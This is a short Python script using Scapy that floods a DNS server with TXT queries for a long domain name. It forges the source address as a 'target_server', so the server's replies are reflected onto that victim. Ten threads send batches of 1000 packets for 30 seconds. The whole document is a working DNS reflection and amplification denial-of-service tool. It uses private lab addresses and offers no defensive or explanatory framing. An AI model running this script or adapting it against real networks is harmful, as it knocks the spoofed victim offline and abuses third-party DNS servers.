from scapy.all import *
import threading
import time

# Define the target domain, server, and port
domain = "this-is-the-rather-long-domain-name.example.com"
dns_server = "10.12.0.20"
port = 5353
# target_server = "10.12.0.10"
target_server = "10.1.0.2"

dns_request = IP(dst=dns_server, src=target_server) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname=domain, qtype='TXT'))

def send_dns_request(end_time):
    while time.time() < end_time:
        response = send(dns_request, verbose=0, count=1000)

num_threads = 10
duration = 30  # Duration in seconds

end_time = time.time() + duration

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_dns_request, args=(end_time,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

